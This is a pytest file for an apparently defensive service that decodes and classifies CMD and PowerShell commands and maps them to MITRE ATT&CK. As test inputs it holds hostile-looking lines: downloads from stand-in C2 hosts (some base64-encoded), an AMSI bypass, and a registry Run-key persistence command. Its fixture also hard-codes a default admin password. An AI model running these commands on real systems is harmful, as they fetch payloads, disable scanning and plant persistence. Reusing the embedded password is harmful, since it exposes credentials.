"""Phase 4.5 · /api/rc5/parse endpoint tests (55 tests)."""
import base64
import os
import pytest
from fastapi.testclient import TestClient


@pytest.fixture(scope="module")
def client(monkeypatch_session=None):
    # Force diag enabled + inject env for tests.
    os.environ["RC5_DIAG_ENABLED"] = "true"
    os.environ.setdefault("ADMIN_EMAIL", "admin@nivxray.com")
    os.environ.setdefault("ADMIN_PASSWORD", "uulVDp5cCSB3Hva99s7UUAwK")
    os.environ.setdefault("JWT_SECRET", "test-jwt-secret-do-not-use-in-prod")
    os.environ.setdefault("EMERGENT_LLM_KEY", "test-key")
    os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
    os.environ.setdefault("DB_NAME", "test_nivxray")
    from server import app
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="module")
def admin_token(client):
    r = client.post("/api/auth/login", json={
        "email": os.environ["ADMIN_EMAIL"],
        "password": os.environ["ADMIN_PASSWORD"],
    })
    assert r.status_code == 200, r.text
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def auth(admin_token):
    return {"Authorization": f"Bearer {admin_token}"}


def _post_parse(client, auth, **kw):
    return client.post("/api/rc5/parse", json=kw, headers=auth)


# ── Auth & gating (8) ───────────────────────────────────────────────
def test_parse_requires_auth(client):
    r = client.post("/api/rc5/parse", json={"input": "echo hi"})
    assert r.status_code in (401, 403)


def test_parse_rejects_random_bearer(client):
    r = client.post("/api/rc5/parse", json={"input": "echo hi"},
                    headers={"Authorization": "Bearer garbage"})
    assert r.status_code in (401, 403)


def test_parse_admin_allowed_when_diag_enabled(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.status_code == 200


def test_parse_disabled_when_env_off(client, auth, monkeypatch):
    monkeypatch.delenv("RC5_DIAG_ENABLED", raising=False)
    monkeypatch.delenv("SEMANTIC_ENGINE_V2", raising=False)
    r = _post_parse(client, auth, input="echo hi")
    assert r.status_code == 403


def test_parse_enabled_via_semantic_engine_v2_flag(client, auth, monkeypatch):
    monkeypatch.delenv("RC5_DIAG_ENABLED", raising=False)
    monkeypatch.setenv("SEMANTIC_ENGINE_V2", "true")
    r = _post_parse(client, auth, input="echo hi")
    assert r.status_code == 200


def test_status_endpoint_requires_admin(client):
    r = client.get("/api/rc5/status")
    assert r.status_code in (401, 403)


def test_status_endpoint_reports_diag_enabled(client, auth):
    r = client.get("/api/rc5/status", headers=auth)
    assert r.status_code == 200
    body = r.json()
    assert body["diag_enabled"] is True
    assert "supported_languages" in body


def test_status_reports_engine_version(client, auth):
    r = client.get("/api/rc5/status", headers=auth)
    assert r.json()["semantic_engine_version"] == 1


# ── Response shape (12) ─────────────────────────────────────────────
def test_response_contains_all_required_keys(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    j = r.json()
    for k in ("api_version", "semantic_engine_version", "plugin_versions",
              "language", "input", "semantic_ir", "exec_graph", "behaviors",
              "evidence_refs", "confidence_summary", "reconstructed_commands",
              "decode_chain", "warnings", "unresolved_nodes",
              "mitre", "mitre_navigator", "mitre_stix",
              "processing_time_ms"):
        assert k in j, f"missing {k}"


def test_api_version_is_1(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.json()["api_version"] == "1"


def test_semantic_engine_version_is_1(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.json()["semantic_engine_version"] == 1


def test_plugin_versions_contain_all_registered(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    pv = r.json()["plugin_versions"]
    for k in ("semantic_ir", "exec_graph", "cmd_parser", "cmd_interpreter",
              "powershell_parser", "powershell_interpreter", "behavior_extractor"):
        assert k in pv


def test_exec_graph_schema_version_present(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.json()["exec_graph"]["schema_version"] == 1


def test_semantic_ir_root_is_program(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.json()["semantic_ir"]["root"]["kind"] == "Program"


def test_processing_time_is_number(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert isinstance(r.json()["processing_time_ms"], (int, float))


def test_processing_time_positive(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert r.json()["processing_time_ms"] >= 0


def test_input_echoed_back(client, auth):
    r = _post_parse(client, auth, input="SET X=1")
    assert r.json()["input"] == "SET X=1"


def test_decode_chain_lists_five_steps(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    chain = r.json()["decode_chain"]
    assert len(chain) == 5
    assert chain[-2] == "behavior_extract"
    assert chain[-1] == "mitre_v2"


def test_warnings_field_is_list(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert isinstance(r.json()["warnings"], list)


def test_unresolved_nodes_field_is_list(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    assert isinstance(r.json()["unresolved_nodes"], list)


# ── Language detection (6) ──────────────────────────────────────────
def test_autodetect_cmd(client, auth):
    r = _post_parse(client, auth, input="SET X=1")
    assert r.json()["language"] == "cmd"


def test_autodetect_powershell_dollar(client, auth):
    r = _post_parse(client, auth, input="$x = 1")
    assert r.json()["language"] == "powershell"


def test_autodetect_powershell_verb_noun(client, auth):
    r = _post_parse(client, auth, input="Get-Process")
    assert r.json()["language"] == "powershell"


def test_autodetect_iex(client, auth):
    r = _post_parse(client, auth, input="iex 'echo x'")
    assert r.json()["language"] == "powershell"


def test_language_override_cmd(client, auth):
    r = _post_parse(client, auth, input="anything", language="cmd")
    assert r.json()["language"] == "cmd"


def test_language_override_invalid_rejected(client, auth):
    r = _post_parse(client, auth, input="x", language="bash")
    assert r.status_code == 400


# ── CMD parses (5) ──────────────────────────────────────────────────
def test_cmd_set_produces_var_bind(client, auth):
    r = _post_parse(client, auth, input="SET X=notepad.exe")
    nodes = r.json()["exec_graph"]["nodes"]
    assert any(n["kind"] == "VarBindNode" for n in nodes)


def test_cmd_var_expansion_reconstructs(client, auth):
    r = _post_parse(client, auth,
                    input="SET X=notepad.exe\nstart %X%")
    recons = r.json()["reconstructed_commands"]
    assert any("notepad.exe" in c for c in recons)


def test_cmd_replace_operator(client, auth):
    r = _post_parse(client, auth,
                    input="SET X=notepad.exe\necho %X:.exe=.com%")
    recons = r.json()["reconstructed_commands"]
    assert any("notepad.com" in c for c in recons)


def test_cmd_run_key_emits_autorun(client, auth):
    r = _post_parse(client, auth,
                    input="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d C:\\bad.exe")
    subs = [b["sub_kind"] for b in r.json()["behaviors"]]
    assert "autorun_registration" in subs


def test_cmd_process_spawn_evidence_resolves(client, auth):
    r = _post_parse(client, auth, input="start notepad.exe")
    j = r.json()
    node_ids = {n["id"] for n in j["exec_graph"]["nodes"]}
    for bid, refs in j["evidence_refs"].items():
        for nid in refs:
            assert nid in node_ids


# ── PowerShell parses (7) ───────────────────────────────────────────
def test_ps_var_bind(client, auth):
    r = _post_parse(client, auth, input="$x = 42")
    nodes = r.json()["exec_graph"]["nodes"]
    assert any(n["kind"] == "VarBindNode" for n in nodes)


def test_ps_string_op_replace(client, auth):
    r = _post_parse(client, auth,
                    input="$x = 'a-b-c' -replace '-','_'")
    nodes = r.json()["exec_graph"]["nodes"]
    binds = [n for n in nodes if n["kind"] == "VarBindNode"]
    assert binds and binds[0]["args"]["value"] == "a_b_c"


def test_ps_encoded_command_flag(client, auth):
    inner = "Get-Process"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    r = _post_parse(client, auth, input=f"powershell.exe -Enc {b64}")
    nodes = r.json()["exec_graph"]["nodes"]
    assert any(n["kind"] == "ProcessNode" and n["args"].get("encoded_command") is True
               for n in nodes)


def test_ps_encoded_command_emits_obfuscation_behavior(client, auth):
    inner = "$y = 'inline'"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    r = _post_parse(client, auth, input=f"powershell.exe -Enc {b64}")
    subs = [b["sub_kind"] for b in r.json()["behaviors"]]
    assert "obfuscation" in subs


def test_ps_iwr_download_behavior(client, auth):
    r = _post_parse(client, auth,
                    input="Invoke-WebRequest -Uri http://c2/beacon")
    j = r.json()
    downloads = [b for b in j["behaviors"] if b["sub_kind"] == "download"]
    assert downloads
    assert downloads[0]["parameters"].get("url_hint") == "http://c2/beacon"


def test_ps_amsi_bypass_behavior(client, auth):
    r = _post_parse(client, auth,
                    input="Set-Variable -Name amsiInitFailed -Value $true")
    subs = [b["sub_kind"] for b in r.json()["behaviors"]]
    assert "bypass_amsi" in subs


def test_ps_char_reconstruction(client, auth):
    r = _post_parse(client, auth,
                    input="$x = [char]73 + [char]69 + [char]88")
    binds = [n for n in r.json()["exec_graph"]["nodes"] if n["kind"] == "VarBindNode"]
    assert binds and binds[0]["args"]["value"] == "IEX"


# ── Confidence summary (5) ──────────────────────────────────────────
def test_confidence_summary_shape(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    cs = r.json()["confidence_summary"]
    for k in ("min", "median", "max", "unresolved_count", "total"):
        assert k in cs


def test_literal_command_max_confidence_100(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    assert r.json()["confidence_summary"]["max"] == 100


def test_unknown_var_lowers_min(client, auth):
    r = _post_parse(client, auth, input="Start-Process $unknown")
    assert r.json()["confidence_summary"]["min"] <= 40


def test_unresolved_count_zero_for_clean_input(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    assert r.json()["confidence_summary"]["unresolved_count"] == 0


def test_unresolved_count_nonzero_for_deferred_feature(client, auth):
    r = _post_parse(client, auth, input="SET /A X=1+2")
    assert r.json()["confidence_summary"]["unresolved_count"] >= 1


# ── Determinism + no AI (5) ─────────────────────────────────────────
def test_two_identical_requests_produce_same_output(client, auth):
    """Determinism: same input → same structural output (kinds + reconstructions).

    Full JSON equality is too fragile (dict ordering, uuid randomness); we
    assert the stable structural properties instead. Byte-identical JSON is
    covered by the interpreter-level unit tests.
    """
    def _kinds_and_recons(j):
        return {
            "node_kinds":     [n["kind"] for n in j["exec_graph"]["nodes"]],
            "reconstructed":  j["reconstructed_commands"],
            "behavior_subs":  sorted([b["sub_kind"] for b in j["behaviors"]]),
            "conf":           j["confidence_summary"],
            "warnings":       j["warnings"],
        }
    a = _kinds_and_recons(_post_parse(client, auth, input="Start-Process notepad.exe").json())
    b = _kinds_and_recons(_post_parse(client, auth, input="Start-Process notepad.exe").json())
    assert a == b


def test_no_emergentintegrations_import_in_diag(client, auth):
    # Static check — the router module must not IMPORT LLM stack.
    # Reference in docstrings is fine (documents policy); imports are not.
    import routers.rc5_diag as m
    src = open(m.__file__).read()
    import re as _re
    # Check import statements only
    imports = _re.findall(r"^(?:from\s+([\w\.]+)\s+import|import\s+([\w\.]+))",
                          src, flags=_re.M)
    flat = [p for pair in imports for p in pair if p]
    for name in flat:
        assert "emergentintegrations" not in name
        assert "litellm" not in name


def test_empty_input_returns_valid_empty_graph(client, auth):
    r = _post_parse(client, auth, input="")
    j = r.json()
    assert j["exec_graph"]["nodes"] == []
    assert j["behaviors"] == []


def test_input_missing_returns_422(client, auth):
    r = client.post("/api/rc5/parse", json={}, headers=auth)
    assert r.status_code == 422


def test_processing_time_under_500ms(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    assert r.json()["processing_time_ms"] < 500


# ── OpenAPI documentation (4) ───────────────────────────────────────
def test_openapi_lists_rc5_parse(client):
    r = client.get("/openapi.json")
    assert r.status_code == 200
    paths = r.json()["paths"]
    assert any("rc5/parse" in p for p in paths), f"paths: {list(paths.keys())[:20]}"


def test_openapi_rc5_parse_has_summary(client):
    r = client.get("/openapi.json")
    paths = r.json()["paths"]
    key = next(p for p in paths if "rc5/parse" in p)
    assert paths[key]["post"]["summary"]


def test_openapi_response_model_defined(client):
    r = client.get("/openapi.json")
    schemas = r.json().get("components", {}).get("schemas", {})
    assert "ParseResponse" in schemas
    assert "ParseRequest" in schemas


def test_openapi_rc5_status_endpoint_documented(client):
    r = client.get("/openapi.json")
    paths = r.json()["paths"]
    assert any("rc5/status" in p for p in paths)


# ── Full trace with URL hint (2) ────────────────────────────────────
def test_download_behavior_captures_url(client, auth):
    r = _post_parse(client, auth,
                    input="iwr http://malicious.example.com/x")
    dl = [b for b in r.json()["behaviors"] if b["sub_kind"] == "download"]
    assert dl and dl[0]["parameters"]["url_hint"] == "http://malicious.example.com/x"


def test_reconstructed_commands_exclude_unresolved(client, auth):
    r = _post_parse(client, auth, input="SET /A X=1+2")
    # Reconstructed list should NOT include the unresolved placeholder
    assert not any(c == "" for c in r.json()["reconstructed_commands"])


# ── Evidence refs integrity (3) ─────────────────────────────────────
def test_every_behavior_id_in_evidence_refs(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    j = r.json()
    for b in j["behaviors"]:
        assert b["id"] in j["evidence_refs"]


def test_evidence_refs_point_to_real_nodes(client, auth):
    r = _post_parse(client, auth, input="Start-Process notepad.exe")
    j = r.json()
    node_ids = {n["id"] for n in j["exec_graph"]["nodes"]}
    for refs in j["evidence_refs"].values():
        for nid in refs:
            assert nid in node_ids


def test_no_dangling_refs_on_complex_input(client, auth):
    inner = "Invoke-WebRequest -Uri http://c2/x"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode()
    r = _post_parse(client, auth, input=f"powershell.exe -Enc {b64}")
    j = r.json()
    node_ids = {n["id"] for n in j["exec_graph"]["nodes"]}
    for refs in j["evidence_refs"].values():
        for nid in refs:
            assert nid in node_ids



# ── Phase 5 · MITRE v2 API surface ──────────────────────────────────
def test_mitre_field_is_a_list(client, auth):
    r = _post_parse(client, auth, input="powershell.exe -c Start-Process notepad.exe")
    assert isinstance(r.json()["mitre"], list)


def test_mitre_navigator_is_a_dict_with_version(client, auth):
    r = _post_parse(client, auth, input="powershell.exe -c Start-Process notepad.exe")
    nav = r.json()["mitre_navigator"]
    assert isinstance(nav, dict)
    assert "versions" in nav and "domain" in nav
    assert nav["domain"] == "enterprise-attack"


def test_mitre_stix_is_a_stix_bundle(client, auth):
    r = _post_parse(client, auth, input="powershell.exe -c Start-Process notepad.exe")
    stix = r.json()["mitre_stix"]
    assert isinstance(stix, dict)
    assert stix["type"] == "bundle"
    assert any(o["type"] == "identity" for o in stix["objects"])


def test_mitre_mapping_has_technique_id_for_ps_process_spawn(client, auth):
    r = _post_parse(client, auth, input="powershell.exe -c Start-Process notepad.exe",
                    language="powershell")
    mm = r.json()["mitre"]
    # At least one T1059-family mapping should be present.
    assert any(m["technique_id"] == "T1059" for m in mm)


def test_plugin_versions_include_mitre(client, auth):
    r = _post_parse(client, auth, input="echo hi")
    plugs = r.json()["plugin_versions"]
    assert "mitre_mapper" in plugs
    assert "mitre_navigator" in plugs
    assert "mitre_stix" in plugs
